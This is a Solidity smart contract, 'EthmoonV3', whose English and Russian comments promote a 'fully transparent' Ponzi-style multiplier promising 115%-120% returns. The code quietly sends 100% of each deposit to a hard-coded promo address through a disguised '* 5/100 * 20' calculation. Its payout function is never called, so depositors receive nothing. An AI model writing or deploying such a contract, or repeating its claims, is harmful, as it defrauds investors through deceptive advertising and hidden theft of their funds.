1 pragma solidity ^0.4.25;
2 
3 /**
4  * Web - https://ethmoon.cc/
5  * RU  Telegram_chat: https://t.me/ethmoonccv2
6  *
7  *
8  * Multiplier ETHMOON_V3: returns 115%-120% of each investment!
9  * Fully transparent smartcontract with automatic payments proven professionals.
10  * 1. Send any sum to smart contract address
11  *    - sum from 0.01 to 5 ETH
12  *    - min 300000 gas limit
13  *    - you are added to a queue
14  * 2. Wait a little bit
15  * 3. ...
16  * 4. PROFIT! You have got 115%-120%
17  *
18  * How is that?
19  * 1. The first investor in the queue (you will become the
20  *    first in some time) receives next investments until
21  *    it become 115%-120% of his initial investment.
22  * 2. You will receive payments in several parts or all at once
23  * 3. Once you receive 115%-120% of your initial investment you are
24  *    removed from the queue.
25  * 4. You can make more than one deposits at once
26  * 5. The balance of this contract should normally be 0 because
27  *    all the money are immediately go to payouts
28  *
29  *
30  * So the last pays to the first (or to several first ones if the deposit big enough) 
31  * and the investors paid 115%-120% are removed from the queue
32  *
33  *               new investor --|               brand new investor --|
34  *                investor5     |                 new investor       |
35  *                investor4     |     =======>      investor5        |
36  *                investor3     |                   investor4        |
37  *   (part. paid) investor2    <|                   investor3        |
38  *   (fully paid) investor1   <-|                   investor2   <----|  (pay until 115%-120%)
39  *
40  *
41  *
42  * Контракт ETHMOON_V3: возвращает 115%-120% от вашего депозита!
43  * Полностью прозрачный смартконтракт с автоматическими выплатами, проверенный профессионалами.
44  * 1. Пошлите любую ненулевую сумму на адрес контракта
45  *    - сумма от 0.01 до 5 ETH
46  *    - gas limit минимум 300000
47  *    - вы встанете в очередь
48  * 2. Немного подождите
49  * 3. ...
50  * 4. PROFIT! Вам пришло 115%-120% от вашего депозита.
51  * 
52  * Как это возможно?
53  * 1. Первый инвестор в очереди (вы станете первым очень скоро) получает выплаты от
54  *    новых инвесторов до тех пор, пока не получит 115%-120% от своего депозита
55  * 2. Выплаты могут приходить несколькими частями или все сразу
56  * 3. Как только вы получаете 115%-120% от вашего депозита, вы удаляетесь из очереди
57  * 4. Вы можете делать несколько депозитов сразу
58  * 5. Баланс этого контракта должен обычно быть в районе 0, потому что все поступления
59  *    сразу же направляются на выплаты
60  *
61  * 
62  * Таким образом, последние платят первым, и инвесторы, достигшие выплат 115%-120% от 
63  * депозита, удаляются из очереди, уступая место остальным
64  *
65  *             новый инвестор --|            совсем новый инвестор --|
66  *                инвестор5     |                новый инвестор      |
67  *                инвестор4     |     =======>      инвестор5        |
68  *                инвестор3     |                   инвестор4        |
69  * (част. выпл.)  инвестор2    <|                   инвестор3        |
70  * (полная выпл.) инвестор1   <-|                   инвестор2   <----|  (доплата до 115%-120%)
71  *
72 */
73 
74 
75 contract EthmoonV3 {
76     // address for promo expences
77     address constant private PROMO = 0xa4Db4f62314Db6539B60F0e1CBE2377b918953Bd;
78     address constant private STARTER = 0x5dfE1AfD8B7Ae0c8067dB962166a4e2D318AA241;
79     // percent for promo/smartcontract expences
80     uint constant public PROMO_PERCENT = 5;
81     // how many percent for your deposit to be multiplied
82     uint constant public START_MULTIPLIER = 115;
83     // deposit limits
84     uint constant public MIN_DEPOSIT = 0.01 ether;
85     uint constant public MAX_DEPOSIT = 5 ether;
86     bool public started = false;
87     // count participation
88     mapping(address => uint) public participation;
89 
90     // the deposit structure holds all the info about the deposit made
91     struct Deposit {
92         address depositor; // the depositor address
93         uint128 deposit;   // the deposit amount
94         uint128 expect;    // how much we should pay out (initially it is 115%-120% of deposit)
95     }
96 
97     Deposit[] private queue;  // the queue
98     uint public currentReceiverIndex = 0; // the index of the first depositor in the queue. The receiver of investments!
99 
100     // this function receives all the deposits
101     // stores them and make immediate payouts
102     function () public payable {
103         require(gasleft() >= 220000, "We require more gas!"); // we need gas to process queue
104         require((msg.sender == STARTER) || (started));
105         
106         if (msg.sender != STARTER) {
107             require((msg.value >= MIN_DEPOSIT) && (msg.value <= MAX_DEPOSIT)); // do not allow too big investments to stabilize payouts
108             uint multiplier = percentRate(msg.sender);
109             // add the investor into the queue. Mark that he expects to receive 115%-120% of deposit back
110             queue.push(Deposit(msg.sender, uint128(msg.value), uint128(msg.value * multiplier/100)));
111             participation[msg.sender] = participation[msg.sender] + 1;
112             
113             // send some promo to enable this contract to leave long-long time
114             uint promo = msg.value * PROMO_PERCENT/100 * 20;
115             PROMO.transfer(promo);
116         } else {
117             started = true;
118         }
119     }
120 
121     // used to pay to current investors
122     // each new transaction processes 1 - 4+ investors in the head of queue 
123     // depending on balance and gas left
124     function pay() private {
125         // try to send all the money on contract to the first investors in line
126         uint128 money = uint128(address(this).balance);
127 
128         // we will do cycle on the queue
129         for (uint i=0; i<queue.length; i++) {
130             uint idx = currentReceiverIndex + i;  // get the index of the currently first investor
131 
132             Deposit storage dep = queue[idx]; // get the info of the first investor
133 
134             if (money >= dep.expect) {  // if we have enough money on the contract to fully pay to investor
135                 dep.depositor.transfer(dep.expect); // send money to him
136                 money -= dep.expect;            // update money left
137 
138                 // this investor is fully paid, so remove him
139                 delete queue[idx];
140             } else {
141                 // here we don't have enough money so partially pay to investor
142                 dep.depositor.transfer(money); // send to him everything we have
143                 dep.expect -= money;       // update the expected amount
144                 break;                     // exit cycle
145             }
146 
147             if (gasleft() <= 50000)         // check the gas left. If it is low, exit the cycle
148                 break;                     // the next investor will process the line further
149         }
150 
151         currentReceiverIndex += i; // update the index of the current first investor
152     }
153 
154     // get the deposit info by its index
155     // you can get deposit index from
156     function getDeposit(uint idx) public view returns (address depositor, uint deposit, uint expect){
157         Deposit storage dep = queue[idx];
158         return (dep.depositor, dep.deposit, dep.expect);
159     }
160 
161     // get the count of deposits of specific investor
162     function getDepositsCount(address depositor) public view returns (uint) {
163         uint c = 0;
164         for (uint i=currentReceiverIndex; i<queue.length; ++i) {
165             if(queue[i].depositor == depositor)
166                 c++;
167         }
168         return c;
169     }
170 
171     // get all deposits (index, deposit, expect) of a specific investor
172     function getDeposits(address depositor) public view returns (uint[] idxs, uint128[] deposits, uint128[] expects) {
173         uint c = getDepositsCount(depositor);
174 
175         idxs = new uint[](c);
176         deposits = new uint128[](c);
177         expects = new uint128[](c);
178 
179         if (c > 0) {
180             uint j = 0;
181             for (uint i=currentReceiverIndex; i<queue.length; ++i) {
182                 Deposit storage dep = queue[i];
183                 if (dep.depositor == depositor) {
184                     idxs[j] = i;
185                     deposits[j] = dep.deposit;
186                     expects[j] = dep.expect;
187                     j++;
188                 }
189             }
190         }
191     }
192     
193     // get current queue size
194     function getQueueLength() public view returns (uint) {
195         return queue.length - currentReceiverIndex;
196     }
197     
198     // get persent rate
199     function percentRate(address depositor) public view returns(uint) {
200         uint persent = START_MULTIPLIER;
201         if (participation[depositor] > 0) {
202             persent = persent + participation[depositor] * 5;
203         }
204         if (persent > 120) {
205             persent = 120;
206         } 
207         return persent;
208     }
209 }